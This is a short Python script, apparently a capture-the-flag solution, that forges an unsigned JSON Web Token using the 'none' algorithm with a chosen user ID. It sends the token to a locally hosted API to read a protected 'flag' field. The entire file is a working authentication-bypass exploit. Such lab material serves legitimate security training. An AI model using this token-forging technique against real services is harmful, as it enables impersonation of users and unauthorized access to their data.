import requests
from datetime import datetime, timedelta
import jwt


URL = "http://127.0.0.1:5000"


payload = {
    'exp': (datetime.now() + timedelta(seconds=100)).timestamp(),
    'iat': datetime.now().timestamp(),
    'user_id': "84640273"
}
fake_token = jwt.encode(payload, None, algorithm="none")
response = requests.get(f'{URL}/api/data/countries/HackNFlag', headers={"Authorization": f"Beaver {fake_token}"})
country_data = response.json()
print(country_data["countryInfo"]["flag"])
